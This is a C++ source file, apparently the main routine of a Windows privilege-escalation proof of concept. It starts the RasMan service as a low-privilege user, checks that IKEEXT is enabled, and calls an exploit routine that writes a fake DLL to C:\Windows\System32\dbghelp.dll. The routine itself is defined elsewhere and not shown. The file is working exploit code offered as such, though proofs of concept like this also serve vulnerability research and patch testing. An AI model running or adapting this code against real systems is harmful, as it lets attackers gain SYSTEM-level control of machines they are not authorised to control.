// SysTracingPoc.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "pch.h"
#include "Utils.h"
#include "Exploit.h"

#include <iostream>
#include <strsafe.h>
#include <Windows.h>


int main()
{
	Utils utils;
	DWORD dwRet = 0;
	WCHAR lpTempPathBuffer[MAX_PATH];

	WCHAR lpWorkingDirectory[MAX_PATH];
	ZeroMemory(lpWorkingDirectory, MAX_PATH);


	// ========================================================================
	// Check whether RASMAN is running  
	// ========================================================================
	if (utils.IsServiceRunning(L"RasMan"))
	{
		wprintf_s(L"[*] RasMan service is running.\n");
	}
	else
	{
		wprintf_s(L"[!] RasMan service is not running.\n");
		
		// ========================================================================
		// Start RasMan (this can be done as a low priv user)
		// ========================================================================
		if (utils.StartRasman())
		{
			wprintf_s(L"[*] RasMan has been successfully started.\n");
		}
		else
		{
			std::wcout << L"[-] Exploit failed. RasMan couldn't be started." << std::endl;
			return 1;
		}
	}


	// ========================================================================
	// Check whether IKEEXT is disabled   
	// ========================================================================
	if (utils.IsServiceDisabled(L"IKEEXT"))
	{
		wprintf_s(L"[-] Exploit failed. Ikeext service is disabled.\n");
		return 1;
	}
	else
	{
		wprintf_s(L"[*] Ikeext service is enabled.\n");
	}


	// ========================================================================
	// Run the exploit to move the DLL to C:\Windows\System32\ 
	// ========================================================================
	Exploit exploit;
	if (!exploit.Run(L"C:\\Windows\\System32\\dbghelp.dll", L"FakeDll.dll"))
	{
		//wprintf_s(L"[-] Exploit failed.\n");
		return 1;
	}
}



